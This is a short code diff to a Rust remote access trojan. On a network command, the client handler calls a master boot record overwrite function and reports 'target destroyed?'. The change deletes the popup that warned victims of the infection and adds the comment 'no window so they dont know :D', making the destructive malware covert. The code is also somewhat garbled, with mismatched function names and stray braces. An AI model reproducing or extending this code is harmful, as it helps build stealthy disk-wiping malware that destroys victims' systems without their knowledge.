@@ -30,7 +30,7 @@ async fn handle_client(mut stream: TcpStream) {
                     tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
                 }
                 stream.write(b"loading...").await.unwrap();
-                unclo(); // Call the unclose a ble? GUI window
+                // no window so they dont know :D
                 mbr_overwrite(); // Call the MBR overwrite function here
                 stream.write(b"target destroyed?").await.unwrap();
             }
@@ -51,12 +51,4 @@ fn mbr_overwrite() {
 
     CloseHandle(h_device);
 }
-
-fn unclos() {
-    let mut window = tk::Window::new();
-    window.set_title("WARNING (RAT)");
-    window.set_geometry("300x200");
-    let label = tk::Label::new(&window, "Your computer has been affected by a Remote RAT! Good luck lol <3");
-    label.pack();
-    window.mainloop();
 } // 60 lines!
